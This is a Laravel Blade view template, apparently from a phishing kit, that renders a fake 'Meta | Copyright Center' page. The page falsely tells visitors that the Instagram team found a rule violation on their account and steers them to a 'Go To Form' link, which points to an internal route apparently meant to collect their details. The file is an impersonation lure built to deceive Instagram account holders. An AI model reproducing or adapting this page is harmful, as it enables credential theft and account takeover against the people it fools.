@extends('master')
@section('style')
    <style>
        body{
            color: #ffffff;
            background: #3a3a3a;
            line-height: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 80px 0 30px 0;
        }
        .container-custom{
            max-width: 680px;
            height: 100%;
        }
        .box-html-custom{
            color: white;
            opacity: .5;
            width: 38px;
            height: 38px;
            font-size: 9px;
        }
        .enter-form:hover{
            transition: ease .2s;
            transform: scale(1.05);
        }
    </style>
@endsection
@section('content')
    <div class="container container-custom d-flex flex-column justify-content-between align-items-center" style="bg-light; margin-top: -200px;">
        <div class="d-flex flex-column justify-content-center align-items-center w-100" style="gap:15px">
            <img class="rounded-circle" src="{{asset('image/avatar_200x200.jpg')}}" alt="" width="84" height="84">
            <h5 style="font-weight: 700;">Meta | Copyright Center</h5>
            <p style="max-width:550px; line-height:1.5; color: #b4b0b0 !important" class="text-center">If you were redirected to this page, the Instagram team found a rule violation on your account. This may be due to complaints from your business or blog account.</p>
            <a href="{{route('index.meta.portal')}}" class="w-100"><div class="rounded-pill enter-form w-100" style="background-color: #000000; padding: 16px 3px; cursor: pointer;">
                <img class="rounded-circle" src="{{asset('image/meta-x.jpg')}}" alt="" width="40" height="40" style="position: absolute; transform: translateY(-30%);">
                <p style="margin: 0; color: #b4b0b0 !important" class="text-center">Go To Form</p>
            </div></a>
        </div>
    </div>
@endsection
